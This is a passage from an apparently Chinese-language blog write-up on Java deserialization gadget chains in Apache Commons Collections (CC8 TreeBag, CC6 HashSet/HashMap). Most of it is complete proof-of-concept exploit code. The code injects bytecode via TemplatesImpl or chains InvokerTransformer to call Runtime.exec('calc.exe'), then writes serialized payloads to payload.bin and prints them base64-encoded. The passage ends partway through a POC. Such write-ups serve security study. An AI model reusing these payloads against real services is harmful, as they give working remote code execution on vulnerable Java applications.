        <span class="hljs-comment">// &#x65B0;&#x5EFA;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#x6570;&#x7EC4;</span>
        Object[] queueArray = <span class="hljs-keyword">new</span> Object[]{templates, <span class="hljs-number">1</span>};
        <span class="hljs-comment">// &#x53CD;&#x5C04;&#x8BBE;&#x7F6E;PriorityQueue&#x7684;queue&#x503C;</span>
        Field queueField = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;queue&quot;</span>);
        queueField.setAccessible(<span class="hljs-keyword">true</span>);
        queueField.set(priorityQueue, queueArray);
        <span class="hljs-comment">// &#x53CD;&#x5C04;&#x8BBE;&#x7F6E;PriorityQueue&#x7684;size&#x503C;</span>
        Field queueSize = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;size&quot;</span>);
        queueSize.setAccessible(<span class="hljs-keyword">true</span>);
        queueSize.set(priorityQueue, <span class="hljs-number">2</span>);
        <span class="hljs-comment">// &#x53CD;&#x5C04;&#x8BBE;&#x7F6E;PriorityQueue&#x7684;comparator&#x503C;</span>
        Field queueComparator = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);
        queueComparator.setAccessible(<span class="hljs-keyword">true</span>);
        queueComparator.set(priorityQueue, transformingComparator);

        <span class="hljs-keyword">try</span>{
            ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>));
            outputStream.writeObject(priorityQueue);
            outputStream.close();

            ObjectInputStream inputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>));
            inputStream.readObject();
        }<span class="hljs-keyword">catch</span>(Exception e){
            e.printStackTrace();
        }
    }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>{
        <span class="hljs-keyword">final</span> Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> </span>{
        Field field = <span class="hljs-keyword">null</span>;
        <span class="hljs-keyword">try</span> {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(<span class="hljs-keyword">true</span>);
        }
        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) {
            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-keyword">null</span>)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        <span class="hljs-keyword">return</span> field;
    }
}
</code></pre>
<h2 id="cc8new-readobject-treebag">CC8_new readObject TreeBag</h2>
<p>&#x53C2;&#x8003;: <a href="https://www.anquanke.com/post/id/190472" target="_blank">https://www.anquanke.com/post/id/190472</a></p>
<p>8&#x4E0E;2, 4&#x7684;&#x533A;&#x522B;&#x5728;&#x4E8E;&#x4F7F;&#x7528;&#x4E86;&#x65B0;&#x7684;readObject&#x89E6;&#x53D1;&#x70B9;<code>TreeBag</code> , 8&#x53EF;&#x4E0E;2, 4&#x7ED3;&#x5408;&#x4F7F;&#x7528;</p>
<p>TreeBag.readObject</p>
<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>{
        in.defaultReadObject();
        <span class="hljs-meta">@SuppressWarnings</span>(<span class="hljs-string">&quot;unchecked&quot;</span>)  <span class="hljs-comment">// This will fail at runtime if the stream is incorrect</span>
        <span class="hljs-keyword">final</span> Comparator&lt;? <span class="hljs-keyword">super</span> E&gt; comp = (Comparator&lt;? <span class="hljs-keyword">super</span> E&gt;) in.readObject();
        <span class="hljs-comment">// &#x91CD;&#x70B9;&#x5728;doReadObject&#x548C;TreeMap</span>
        <span class="hljs-keyword">super</span>.doReadObject(<span class="hljs-keyword">new</span> TreeMap&lt;E, MutableInteger&gt;(comp), in);
    }
</code></pre>
<p>&#x8DDF;&#x8FDB;doReadObject</p>
<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doReadObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Map&lt;E, MutableInteger&gt; map, <span class="hljs-keyword">final</span> ObjectInputStream in)</span>
            <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>{
        <span class="hljs-keyword">this</span>.map = map;
        <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> entrySize = in.readInt();
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; entrySize; i++) {
            <span class="hljs-meta">@SuppressWarnings</span>(<span class="hljs-string">&quot;unchecked&quot;</span>) <span class="hljs-comment">// This will fail at runtime if the stream is incorrect</span>
            <span class="hljs-keyword">final</span> E obj = (E) in.readObject();
            <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> count = in.readInt();
            map.put(obj, <span class="hljs-keyword">new</span> MutableInteger(count));
            size += count;
        }
    }
</code></pre>
<p>&#x8DDF;&#x8FDB;Treemap.put&#x51FD;&#x6570;</p>
<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">public</span> V <span class="hljs-title">put</span><span class="hljs-params">(K key, V value)</span> </span>{
        Entry&lt;K,V&gt; t = root;
        <span class="hljs-comment">/*root&#x521D;&#x59CB;&#x5316;&#x65F6;&#x4E3A;null
        private transient Entry&lt;K,V&gt; root = null;
        &#x8DDF;&#x8FDB;if&#x8BED;&#x53E5;
        */</span>
        <span class="hljs-keyword">if</span> (t == <span class="hljs-keyword">null</span>) {
            compare(key, key); <span class="hljs-comment">// type (and possibly null) check</span>

            root = <span class="hljs-keyword">new</span> Entry&lt;&gt;(key, value, <span class="hljs-keyword">null</span>);
            size = <span class="hljs-number">1</span>;
            modCount++;
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;
        }
        ...
</code></pre>
<p>&#x8DDF;&#x8FDB;compare&#x51FD;&#x6570;</p>
<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> <span class="hljs-title">compare</span><span class="hljs-params">(Object k1, Object k2)</span> </span>{
        <span class="hljs-comment">/*
        &#x63A7;&#x5236;&#x6B64;&#x5904;&#x7684;comparator
        private final Comparator&lt;? super K&gt; comparator;
        */</span>
        <span class="hljs-keyword">return</span> comparator==<span class="hljs-keyword">null</span> ? ((Comparable&lt;? <span class="hljs-keyword">super</span> K&gt;)k1).compareTo((K)k2)
            : comparator.compare((K)k1, (K)k2);
    }
</code></pre>
<p>&#x901A;&#x8FC7;TransformingComparator.compare&#x89E6;&#x53D1;&#x5373;&#x53EF;</p>
<p>POC</p>
<pre><code class="lang-java"><span class="hljs-keyword">package</span> CommonsCollections;

<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
<span class="hljs-keyword">import</span> javassist.ClassClassPath;
<span class="hljs-keyword">import</span> javassist.ClassPool;
<span class="hljs-keyword">import</span> javassist.CtClass;
<span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections4.bag.TreeBag;
<span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;
<span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;
<span class="hljs-keyword">import</span> org.apache.xalan.transformer.TrAXFilter;

<span class="hljs-keyword">import</span> javax.xml.transform.Templates;
<span class="hljs-keyword">import</span> java.io.FileInputStream;
<span class="hljs-keyword">import</span> java.io.FileOutputStream;
<span class="hljs-keyword">import</span> java.io.ObjectInputStream;
<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;
<span class="hljs-keyword">import</span> java.lang.reflect.Field;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommonsCollections8</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>{
        <span class="hljs-comment">// ClassPool&#x662F; CtClass &#x5BF9;&#x8C61;&#x7684;&#x5BB9;&#x5668;&#x3002;&#x5B9E;&#x4F8B;&#x5316;&#x4E00;&#x4E2A;ClassPool&#x5BB9;&#x5668;&#x3002;</span>
        ClassPool classPool = ClassPool.getDefault();
        <span class="hljs-comment">// &#x5411;&#x5BB9;&#x5668;&#x4E2D;&#x7684;&#x7C7B;&#x641C;&#x7D22;&#x8DEF;&#x5F84;&#x7684;&#x8D77;&#x59CB;&#x4F4D;&#x7F6E;&#x63D2;&#x5165;AbstractTranslet.class&#xFF0C;&#x4E2A;&#x4EBA;&#x8BA4;&#x4E3A;&#x662F;&#x65B9;&#x4FBF;&#x8BA9;&#x540E;&#x9762;&#x80FD;&#x591F;&#x627E;&#x5230;&#x8FD9;&#x4E2A;&#x7C7B;</span>
        classPool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));
        <span class="hljs-comment">// &#x4F7F;&#x7528;&#x5BB9;&#x5668;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;CtClass&#xFF0C;&#x76F8;&#x5F53;&#x4E8E;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;class&#xFF0C;&#x7C7B;&#x540D;&#x4E3A;Evil</span>
        CtClass ctClass = classPool.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);
        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;%s\&quot;);&quot;</span>;
        cmd = String.format(cmd, <span class="hljs-string">&quot;calc.exe&quot;</span>);
        <span class="hljs-comment">// &#x7ED9;&#x8FD9;&#x4E2A;&#x7C7B;&#x521B;&#x5EFA; static &#x4EE3;&#x7801;&#x5757;&#xFF0C;&#x5E76;&#x63D2;&#x5165;&#x5230;&#x7C7B;&#x4E2D;</span>
        ctClass.makeClassInitializer().insertBefore(cmd);
        String className = <span class="hljs-string">&quot;Evil&quot;</span> + System.nanoTime();
        <span class="hljs-comment">// &#x91CD;&#x65B0;&#x8BBE;&#x7F6E;&#x7C7B;&#x540D;&#x4E3A;&#x4E00;&#x4E2A;&#x968F;&#x673A;&#x7684;&#x540D;&#x5B57;</span>
        ctClass.setName(className);
        <span class="hljs-comment">// &#x7ED9;&#x8FD9;&#x4E2A;&#x7C7B;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x7236;&#x7C7B;&#xFF0C;&#x5373;&#x7EE7;&#x627F;&#x8BE5;&#x7236;&#x7C7B;&#x3002;</span>
        ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName())); <span class="hljs-comment">// &#x8BBE;&#x7F6E;&#x7236;&#x7C7B;&#x4E3A;AbstractTranslet&#xFF0C;&#x907F;&#x514D;&#x62A5;&#x9519;</span>
        <span class="hljs-comment">// &#x5C06;&#x8FD9;&#x4E2A;&#x7C7B;&#x8F93;&#x51FA;&#x5230;&#x9879;&#x76EE;&#x76EE;&#x5F55;&#x4E0B;</span>
<span class="hljs-comment">//        ctClass.writeFile(&quot;./&quot;);</span>
        <span class="hljs-comment">// &#x5C06;&#x8FD9;&#x4E2A;class&#x8F6C;&#x6362;&#x4E3A;&#x5B57;&#x8282;&#x6570;&#x7EC4;</span>
        <span class="hljs-keyword">byte</span>[] classBytes = ctClass.toBytecode();
        <span class="hljs-comment">// &#x5C06;&#x5B57;&#x8282;&#x6570;&#x7EC4;&#x653E;&#x7F6E;&#x5230;&#x4E00;&#x4E2A;&#x4E8C;&#x7EF4;&#x6570;&#x7EC4;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x5143;&#x7D20;</span>
        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]{classBytes};
        <span class="hljs-comment">// &#x5B9E;&#x4F8B;&#x5316;TemplatesImpl&#x5BF9;&#x8C61;</span>
        TemplatesImpl templates = (TemplatesImpl) Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>).getDeclaredConstructor(<span class="hljs-keyword">new</span> Class[]{}).newInstance();

        <span class="hljs-comment">/**CommonsCollections4&#x533A;&#x522B;&#x4E4B;&#x5904;*/</span>
        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]{
            <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),
            <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]{Templates.class}, <span class="hljs-keyword">new</span> Object[]{templates})
        };
        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);
        TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(chainedTransformer);

        <span class="hljs-comment">// &#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x8BBE;&#x7F6E;&#x5B57;&#x6BB5;&#x7684;&#x503C;&#x4E3A;&#x4E8C;&#x7EF4;&#x5B57;&#x8282;&#x6570;&#x7EC4;</span>
        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetByteCodes);
        <span class="hljs-comment">// &#x8FDB;&#x5165; defineTransletClasses() &#x65B9;&#x6CD5;&#x9700;&#x8981;&#x7684;&#x6761;&#x4EF6;</span>
        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>);
        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);

        <span class="hljs-comment">/**CommonsCollections8&#x533A;&#x522B;&#x4E4B;&#x5904;*/</span>
        <span class="hljs-comment">// &#x5B9E;&#x4F8B;&#x5316;TreeBag&#x5BF9;&#x8C61;</span>
        TreeBag treeBag = <span class="hljs-keyword">new</span> TreeBag(transformingComparator);
        <span class="hljs-comment">// &#x5C06;TemplatesImpl&#x5BF9;&#x8C61;&#x6DFB;&#x52A0;&#x81F3;TreeBag&#x5EFA;&#x7ACB;&#x7684;TreeMap&#x4E2D;</span>
        treeBag.add(templates);

        <span class="hljs-keyword">try</span>{
            ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>));
            outputStream.writeObject(treeBag);
            outputStream.close();

            ObjectInputStream inputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>));
            inputStream.readObject();
        }<span class="hljs-keyword">catch</span>(Exception e){
            e.printStackTrace();
        }
    }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>{
        <span class="hljs-keyword">final</span> Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> </span>{
        Field field = <span class="hljs-keyword">null</span>;
        <span class="hljs-keyword">try</span> {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(<span class="hljs-keyword">true</span>);
        }
        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) {
            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-keyword">null</span>)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        <span class="hljs-keyword">return</span> field;
    }
}
</code></pre>
<h3 id="commons-collections41&#x53CA;&#x4EE5;&#x4E0A;&#x7684;&#x6539;&#x53D8;">commons-collections:4.1&#x53CA;&#x4EE5;&#x4E0A;&#x7684;&#x6539;&#x53D8;</h3>
<p>&#x524D;&#x9762;&#x63D0;&#x5230;&#x7684;CommonsCollections2,4,8&#xFF0C;&#x90FD;&#x662F;&#x5728;commons-collections:4.0&#x7248;&#x672C;&#x4E0B;&#x624D;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x7684;&#x3002;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x6765;&#x770B;&#x770B;&#x4E3A;&#x4EC0;&#x4E48;&#x5728;4.1&#x53CA;&#x4EE5;&#x4E0A;&#x7248;&#x672C;&#x65E0;&#x6CD5;&#x5229;&#x7528;&#xFF01;</p>
<p>&#x524D;&#x9762;&#x6211;&#x4EEC;&#x7528;&#x5230;&#x4E86;InvokerTransformer&#x548C;InstantiateTransformer&#x4F5C;&#x4E3A;&#x4E2D;&#x8F6C;&#xFF0C;&#x5F88;&#x771F;&#x5B9E;&#xFF0C;4.1&#x7248;&#x672C;&#x8FD9;&#x4E24;&#x4E2A;&#x7C7B;&#x90FD;&#x6CA1;&#x6709;&#x5B9E;&#x73B0;Serializable&#x63A5;&#x53E3;&#xFF0C;&#x5BFC;&#x81F4;&#x6211;&#x4EEC;&#x5728;&#x5E8F;&#x5217;&#x5316;&#x65F6;&#x5C31;&#x65E0;&#x6CD5;&#x5229;&#x7528;&#x8FD9;&#x4E24;&#x4E2A;&#x7C7B;&#x3002;</p>
<pre><code class="lang-java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InstantiateTransformer</span>&lt;<span class="hljs-title">T</span>&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title">Transformer</span>&lt;<span class="hljs-title">Class</span>&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title">T</span>&gt;,<span class="hljs-title">T</span>&gt; </span>{

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InvokerTransformer</span>&lt;<span class="hljs-title">I</span>,<span class="hljs-title">O</span>&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title">Transformer</span>&lt;<span class="hljs-title">I</span>,<span class="hljs-title">O</span>&gt; </span>{
</code></pre>
<h2 id="cc6hashset">CC6_HashSet</h2>
<p>&#x53C2;&#x8003;: <a href="https://www.anquanke.com/post/id/190468" target="_blank">https://www.anquanke.com/post/id/190468</a></p>
<p>&#x4E3B;&#x8981;&#x76EE;&#x7684;&#x662F;&#x5728;HashSet.readObject&#x89E6;&#x53D1;HashMap.put&#x540E;&#x8FDB;&#x800C;&#x5728;TiedMapEntry.hashCode&#x89E6;&#x53D1;LazyMap.get</p>
<pre><code>HashSet.readObject()
    -&gt; HashMap.put(key) =&gt; key.hashCode =&gt; TiedMapEntry.hashCode
    -&gt; TiedMapEntry.getValue
    -&gt; TiedMapEntry.map.get() =&gt; LazyMap.get()
    -&gt; factory.transform() =&gt; ChainedTransformer.transform()
    -&gt; &#x524D;&#x6587;&#x6784;&#x9020;&#x7684;Runtime.getRuntime().exec()
</code></pre><p>POC</p>
<pre><code class="lang-java"><span class="hljs-keyword">package</span> CommonsCollections;

<span class="hljs-keyword">import</span> org.apache.commons.codec.binary.Base64;
<span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;
<span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;

<span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;
<span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;
<span class="hljs-keyword">import</span> java.io.ObjectInputStream;
<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;
<span class="hljs-keyword">import</span> java.lang.reflect.Field;
<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.HashSet;
<span class="hljs-keyword">import</span> java.util.Map;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommonsCollections6</span></span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>{
        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> Transformer[] {<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)};
        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]{
            <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),
            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),
            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),
            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]{String.class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;calc.exe&quot;</span>}),
            <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)
        };
        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(fakeTransformers);
        Map innerMap = <span class="hljs-keyword">new</span> HashMap();
        <span class="hljs-comment">// &#x8C03;&#x7528;decorate&#x4E3B;&#x8981;&#x662F;&#x76F4;&#x63A5;&#x5199;&#x5165;&#x7684;&#x65B9;&#x6CD5;&#x662F;protected, &#x9700;&#x8981;&#x8BBE;&#x7F6E;&#x6743;&#x9650;&#x624D;&#x884C;, &#x800C;&#x8BE5;&#x65B9;&#x6CD5;&#x662F;public</span>
        Map outerMap = LazyMap.decorate(innerMap, chainedTransformer);
        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(outerMap, <span class="hljs-string">&quot;ricky&quot;</span>);
        <span class="hljs-comment">/*jdk1.8*/</span>
        HashSet hashSet = <span class="hljs-keyword">new</span> HashSet(<span class="hljs-number">1</span>);
        hashSet.add(tiedMapEntry);
        outerMap.remove(<span class="hljs-string">&quot;ricky&quot;</span>);

        <span class="hljs-comment">//&#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x8986;&#x76D6;&#x539F;&#x672C;&#x7684;iTransformers&#xFF0C;&#x9632;&#x6B62;&#x5E8F;&#x5217;&#x5316;&#x65F6;&#x5728;&#x672C;&#x5730;&#x6267;&#x884C;&#x547D;&#x4EE4;</span>
        Field f = chainedTransformer.getClass().getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);
        f.setAccessible(<span class="hljs-keyword">true</span>);
        f.set(chainedTransformer, transformers);

        <span class="hljs-keyword">try</span>{
            <span class="hljs-comment">// serialize</span>
            ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();
            ObjectOutputStream objectoutputstream = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);
            objectoutputstream.writeObject(hashSet);
            objectoutputstream.close();
            <span class="hljs-comment">// unserialize</span>
            ObjectInputStream objectinputstream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(barr.toByteArray()));
            objectinputstream.readObject();
            objectinputstream.close();
            System.out.println(Base64.encodeBase64String(barr.toByteArray()));
        }<span class="hljs-keyword">catch</span>(Exception e){
            e.printStackTrace();
        }
    }
}
</code></pre>
<h3 id="&#x820D;&#x5F03;hashset">&#x820D;&#x5F03;HashSet</h3>
<p>&#x56E0;&#x4E3A;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8C03;&#x7528;HashMap.put, &#x53EF;&#x4EE5;&#x820D;&#x5F03;HashSet.readObject&#x8FD9;&#x4E2A;&#x591A;&#x4F59;&#x7684;&#x6865;&#x6881;</p>
<h4 id="&#x89E6;&#x53D1;&#x5931;&#x8D25;&#x95EE;&#x9898;">&#x89E6;&#x53D1;&#x5931;&#x8D25;&#x95EE;&#x9898;</h4>
<p>&#x76F4;&#x63A5;&#x91C7;&#x7528;HashMap.put&#x4F1A;&#x5728;debug&#x7684;&#x65F6;&#x5019;&#x9047;&#x5230;&#x4E00;&#x4E2A;&#x95EE;&#x9898;</p>
<pre><code class="lang-java"><span class="hljs-comment">// LazyMap.get&#x6B64;&#x5904;&#x7684;key&#x503C;&#x4E3A;keykey</span>
Object value = factory.transform(key);
</code></pre>
<p>&#x56E0;&#x4E3A;&#x5728;HashMap&#x7684;put&#x2F45;&#x6CD5;&#x4E2D;&#xFF0C;&#x4E5F;&#x6709;&#x8C03;&#x2F64;&#x5230; hash(key)</p>
<pre><code class="lang-java"><span class="hljs-function"><span class="hljs-keyword">public</span> V <span class="hljs-title">put</span><span class="hljs-params">(K key, V value)</span> </span>{
    <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-keyword">false</span>, <span class="hljs-keyword">true</span>);
}
</code></pre>
<p>&#x8FD9;&#x2FA5;&#x5C31;&#x5BFC;&#x81F4; LazyMap &#x8FD9;&#x4E2A;&#x5229;&#x2F64;&#x94FE;&#x5728;&#x8FD9;&#x2FA5;&#x88AB;&#x8C03;&#x2F64;&#x4E86;&#x2F00;&#x904D;&#xFF0C;&#x56E0;&#x4E3A;&#x524D;&#x2FAF;&#x2F64;&#x4E86; fakeTransformers &#xFF0C;&#x6240;&#x4EE5;&#x6B64;&#x65F6;&#x5E76;&#x6CA1;&#x6709;&#x89E6;&#x53D1;&#x547D;&#x4EE4;&#x6267;&#x2F8F;&#xFF0C;&#x4F46;&#x5B9E;&#x9645;&#x4E0A;&#x4E5F;&#x5BF9;&#x6784;&#x9020;Payload&#x4EA7;&#x2F63;&#x4E86;&#x5F71;&#x54CD;&#x3002; </p>
<p>&#x89E3;&#x51B3;&#x2F45;&#x6CD5;&#x4E5F;&#x5F88;&#x7B80;&#x5355;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x5C06;keykey&#x8FD9;&#x4E2A;Key&#xFF0C;&#x518D;&#x4ECE;outerMap&#x4E2D;&#x79FB;&#x9664;&#x5373;&#x53EF;&#xFF1A; outerMap.remove(&quot;keykey&quot;) </p>
<p>POC</p>
<pre><code class="lang-java"><span class="hljs-keyword">package</span> CommonsCollections;

<span class="hljs-keyword">import</span> org.apache.commons.codec.binary.Base64;
<span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;
<span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;

<span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;
<span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;
<span class="hljs-keyword">import</span> java.io.ObjectInputStream;
<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;
<span class="hljs-keyword">import</span> java.lang.reflect.Field;
<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.Map;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC6_HashMap</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>{
        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> Transformer[] {<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)};
        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]{
            <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),
